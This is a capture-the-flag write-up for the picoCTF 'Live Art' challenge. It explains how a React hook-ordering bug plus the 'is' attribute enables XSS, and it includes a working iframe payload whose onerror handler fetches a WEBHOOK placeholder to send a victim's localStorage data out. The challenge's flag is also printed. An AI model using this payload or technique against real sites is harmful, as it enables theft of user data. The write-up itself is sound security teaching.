# Live Art

### Problem 

You must exploit the React application via XSS to obtain the flag. 

### Solution

This challenge requires a significant amount of prerequisite knowledge. However, nearly all the teams that solved this challenge did not know how their exploit worked. In this writeup I will explain exactly how the exploit works, on top of how to solve it. 

To start off, we must know that React is inherently very resistant to XSS attacks. React automatically escapes text provided such that even if you do manage to inject script content, the page will not run it and will harmlessly display a `<script>`.

Upon inspecting the source code, we can see that there are 2 possible vectors to XSS this website. The first is through the art viewing page, where you can impersonate a peer and send your own image src, thus being able to freely control the `src` attribute of an image. However, any attempts to escape out of the `src` attribute will result in utter failure, thanks to the way React works. The second is through the error page. On this page you are able to control the content of a text area as well as the `href` attribute of an anchor tag. Directly attempting to XSS through a link will result in more failures (I tried). 

Don't give up just yet! If you look at our client code, we notice that the error component is called inside the drawing component. Which seems to be placed as a child inside of the `WrapComponentError` component along with it's fellow `Viewer` component. 

Now this design is quite a strange choice. Why does the creator use the `ErrorPage` component inside the `Drawing` page when the `WrapComponentError` automatically redirects when the `Viewer` component errors? 

If we analyze the code a little bit, we can map out the role the error page plays here: 
```tsx
import { Viewer } from "../viewer";
import { ErrorPage } from "../error";
const getWrappedError = WrapComponentError(ErrorPage)
const getWrappedViewer = WrapComponentError(Viewer);
const view = bigEnough
        ? getWrappedViewer({ image })
        : getWrappedError({ error: "Please make your window bigger" });
return (
    <div>
        { view }
    </div>
);
```
This code appears to check if the screen size is big enough. If it is big enough, the page will render in the viewer, otherwise it will render the error component. You can verify this by dragging the screen size around on this page. 

Do you see the problem in this code? Probably not. It would take an extremely experienced React developer to see the bug present here. And I mean *significantly* experienced because even I didn't catch it until much later on. The people who solved this challenge merely found it by pure luck with a little guessing. 

You see, the return statement in the function is something called `JSX` (or in this case `TSX`, because it is TypeScript), which is a syntax extension to JS made by React. This syntax extension allows developers to return HTML-esque expressions in their functions, which React picks up and renders. I won't go into too much detail about that because you can read the React docs yourself, but the part I want to focus on is how React handles JSX. 

When you have a JSX expression like 
```jsx
return (<p><Cool/></p>);

function Cool() {
    return (<p>{cookieCount}</p>)
}
```
React calls the `createElement` function to construct the element, then calls `Cool` to retrieve the JSX there, which again calls `createElement` and is fed into the virtual DOM tree. `Cool` is considered a child element and is rendered under the jurisdiction of it's parent. 

Do you see the problem now? No? 
```tsx
const view = bigEnough
    ? getWrappedViewer({ image })
    : getWrappedError({ error: "Please make your window bigger" });
```

Instead of calling it as a JSX component, the author calls the function directly. This means whatever JSX is in `getWrappedError` or `getWrappedView` is considered a part of the `_Drawing` component, and not a child as it should be. 

Now this looks like a pretty useless bug. But it is time for us to unveil part 2 of obscure required knowledge for this challenge: hooks!

[Hooks](https://reactjs.org/docs/hooks-intro.html) and states are an integral part of React. Consider a state like a current status of any variable. Hooks can be considered wrappers around this. When the state of something changes, the component gets rerendered. This is very useful when you want to update anything on a page and don't want to trigger an entire reload. This explanation is not extremely accurate but it will do for our purposes. 

Another thing to consider is that hooks attach themselves to the component that calls it. For example, the `_Drawing` creates an `image` hook. Internally, React creates a queue for this component, and places all hooks inside this queue. If the hooks are used as intended, this is completely fine. However, as we can see the JSX was not used as intended, and this causes a pretty severe vulnerability. 

Revisiting our live art code, we can see that our `ErrorPage` creates an hook: 
```ts
const params = useHashParams<{ error: string, returnTo: string }>();
//which in turn calls: 
const [params, setParams] = React.useState(getHashParams<T>());
```
Uh-oh! Stinky! Oopsie Woopsie! A little bit of a fcky wucky! A wittle fcko boingo! 

Our code here creates a hook, and if you recall, our ErrorPage was treated as a part of the `_Drawing` page. This means that the hook is now attached to the `_Drawing` component instead of the `ErrorPage` component and placed in the hook queue for `_Drawing`. My stinky-meter is rising. 

Let's take a look at `Viewer`. We are greeted with 
```ts
const [dimensions, updateDimensions] = React.useReducer(//yada yada)
```
Now `useReducer` is another form of a hook. Uh-oh again! This hook is also placed in the former-parent's queue! Moreover, when React accesses the state, it might access the wrong one due to these states being accessed via queue index! My stinky-meter is not doing very well. 

Now basically, if we manage to do a little trickery, we can fool React into using `params` hook from the `ErrorPage` as the `dimensions` of the `Viewer`. Quite stinky indeed.

Now if we scroll down a little...
```tsx
return (
    <div>
        <h1>Viewing</h1>
        <img src={props.image} { ...dimensions }/>
    </div>
)
```
I am heartbroken. The author used spread syntax here. What spread syntax (`...`) does is that it "deflates" the object. For example, if `dimensions` was `{test: 'hi'}`, the code is similar to: `<img src={props.image} test={'hi'}/>`. My stinky meter has shattered. Now that's dangerous, don't ya think?

Now we kind of know how to do pwn now: 
1. Start window at < 600px wide and attach an error hash payload (e.g. `#test=hi`) to the link. We want the error page to be triggered first so the hook is placed into the queue. 
2. Increase page width. We can only fire the `resize` event once. If we do it more than once React will place the queue properly. We want to make sure that when the hook initializes in `Viewer` it accesses the incorrect state in the queue which contains our malicious payload. 
3. PWN!

Now that we can inject anything we want into that image, we can try injecting an `onerror` attribute along with a faulty `src` to trigger the JS. However, when we try this, the resize causes the `onerror` to simply vanish. 

Why does this happen? As it turns out, React does not recognize `onerror` as an attribute. `onError` is a valid attribute for this React object, but if we try that, it also disappears. It seems like React expects a `Function` type and not a `string`. How can we get React to insert a valid onerror HTML then?

Onto part 3 of obscure React/HTML knowledge! This is the custom component clue provided. When an HTML element has an `is` attribute, it is defined as a custom element. Taking a closer look at how React renders things internally, it appears that it looks at `isCustomComponentTag`, and if it exists, renders whatever you want it to without giving you a hassle. Apparently, React bails on handling props because it assumes that, since you are using a custom element, you will be handling the props yourself ([citation](https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/)). 

This means that if you attach `&is=` to your URL, the JS should run. Now we basically have our solution: 
1. Open popup/iframe to `http://localhost:4000/drawing/wiudsaadwas#error={do_stuff_here}&src=stuff&is=` with a size of < 600px
2. Set size to 601 px
3. Win

To do this, we can use the following payload: 
```html
<body>
    <iframe id="iframe" src="http://localhost:4000/drawing/syahdas#onerror=fetch('WEBHOOK',{method:'POST',headers:[['Content-Type','application/json']],body:JSON.stringify({content:window.localStorage.getItem('username')})})&src=urmom&is=" width="599"></iframe>
    <script>
        setTimeout(function() {
            document.getElementById("iframe").width = 601;
        }, 2000)
    </script>
</body>
```
This code will open an iframe to the page at 599 px, set iframe to 601 px afer 2 seconds, and the code on the page will execute, sending the localStorage content to us through a webhook. 

To PWN successfully, you will need to host this on your own HTTP server and then send the link through the XSS submission page. 

Yay!

Our flag is then `picoCTF{beam_me_up_reacty_eb269a4c}`

P.S. I solved this challenge after it was finished
